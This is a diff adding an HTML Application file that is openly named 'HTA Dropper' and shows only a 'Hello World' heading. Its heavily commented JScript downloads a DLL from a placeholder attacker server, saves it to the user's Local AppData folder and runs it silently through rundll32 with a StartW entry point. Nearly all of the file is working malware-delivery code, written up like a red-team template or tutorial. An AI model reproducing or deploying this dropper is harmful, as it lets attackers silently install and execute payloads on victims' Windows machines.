@@ -1,0 +1,78 @@
+<HTML>
+	<HEAD>
+		<!-- The HTA:APPLICATION tag defines properties of the HTA window:
+			- ID: gives the application an internal name
+			- BORDER: controls the border thickness (e.g. bold, thin, none)
+			- BORDERSTYLE: defines the window's border style (e.g. normal, complex, raised) -->
+		<HTA:APPLICATION 
+			ID="HTA Dropper"/>
+			
+		<!-- The TITLE tag sets the text shown in the window's title bar -->
+		<TITLE>HTA - Hello World</TITLE>
+		<SCRIPT>
+			/* Initialize three ActiveX objects used for system scripting:
+				- WScript.Shell: Provides access to WSH
+			    - MSXML2.XMLHTTP: Enables sending HTTP requests and receiving responses
+			    - ADODB.Stream: Provides access to the system file stream for saving and writing to 
+					files */
+			var wScriptObj = new ActiveXObject('WScript.Shell');
+			var xmlHTTPObj = new ActiveXObject('MSXML2.XMLHTTP');
+			var fStreamObj = new ActiveXObject('ADODB.Stream');
+			
+			/* Define a filename and build two related paths:
+				- payloadVal: The payload  to work with
+				- payloadURL: The remote HTTP URL constructed by appending the filename 
+					to a base server address
+				- payloadLoc: the local filesystem path where the file would be located;
+					ExpandEnvironmentStrings('%LOCALAPPDATA%') resolves the current user's
+					Local App Data folder */
+			var payloadVal = '... e.g. LITTLE_VIOLA.dll';
+			var payloadURL = '... e.g. http://server.hackerforce.io/' + payloadVal;
+			var payloadLoc = wScriptObj.ExpandEnvironmentStrings('%LOCALAPPDATA%') + '\\' + payloadVal;
+			
+			/* Function to download a file from the provided URL and save it to the path specified by
+				payloadLoc */
+			function fetchPayload(payloadURL) {
+				/* Open a synchronous HTTP GET request to the given URL:
+					- Method: 'GET'
+					- URL: payloadURL (the URL of our hosted payload)
+					- async: false (synchronous) */
+				xmlHTTPObj.Open('GET', payloadURL, false);
+				
+				/* Send the HTTP request (blocking until finished because request is synchronous) */
+				xmlHTTPObj.Send();
+				
+				/* If the server responded with HTTP 200 OK, write the response body into the 
+					ADODB.Stream object as binary data; otherwise return */
+				if (xmlHTTPObj.Status == 200) {
+					fStreamObj.Open();
+					fStreamObj.Type = 1;
+					fStreamObj.Write(xmlHTTPObj.ResponseBody);
+				} else {
+					return;
+				}
+				
+				/* Save the contents of the stream to disk
+					- Mode 2: adSaveCreateOverWrite (create or overwrite the file at payloadLoc). */
+				fStreamObj.SaveToFile(payloadLoc, 2);
+				
+				/* Close the stream to release handles */
+				fStreamObj.Close();
+			}
+			
+			/* Fetch the payload */
+			fetchPayload(payloadURL);
+			
+			/* Execute the fetched payload */
+			var command = 'rundll32' + ' ' + payloadLoc + ',StartW';
+			if (xmlHTTPObj.Status == 200) {
+				wScriptObj.Run(command, 0);
+			}
+		</SCRIPT>
+	</HEAD>
+	<BODY>
+		<!-- The BODY section contains the visible content of the application; a heading that
+			says 'HTA - Hello World' -->
+		<H2>HTA - Hello World</H2>
+	</BODY>
+</HTML>
